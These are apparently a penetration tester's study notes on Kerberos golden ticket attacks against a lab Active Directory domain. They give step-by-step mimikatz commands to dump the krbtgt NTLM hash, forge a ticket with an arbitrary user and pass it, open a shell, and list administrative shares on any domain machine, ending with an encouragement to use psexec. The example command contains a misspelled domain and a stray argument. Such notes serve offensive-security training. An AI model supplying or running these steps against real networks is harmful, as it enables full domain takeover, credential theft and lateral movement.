# Golden Ticket Attacks

## What is a "Golden Ticket" ?
- when we compromise the krbtgt(kerberos ticket granting ticket) account -> we own the domain
- we can request access to any resource on the domain
- golden tickets = complete access to every machine

## How to perform golden ticket attacks
- get mimikatz on system
```cmd
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```
- open Notepad
- copy Domain SID: "Domain : MARVEL / S-1-5-21-3764243235-116258074-2631445384
- copy krbtgt's NTLM hash

### Generate Ticket ( and pass the ticket )
```cmd
kerberos::golden /User:<user(can be fake)> /domain:<real domain> /sid:<domain sid> /krbtgt:<hash> /id:<RID> /ptt
# Example
kerberos::golden /User:fakeUser123 /domain:marlve.local /sid:S-1-5-21-3764243235-116258074-2631445384 /krbtgt:<hash> krbtgt /id:502 /ptt
```
- -ptt = pass the ticket

```cmd
misc::cmd
```
# GOLDEN TICKET HAS BEEN CREATED AND SHELL IS OPEN!

```bash
dir \\<any IP in domain>\c$
```
-> can list every file in any directory of any account in domain
-> DOWNLOAD PSEXEC.py and HAVE FUN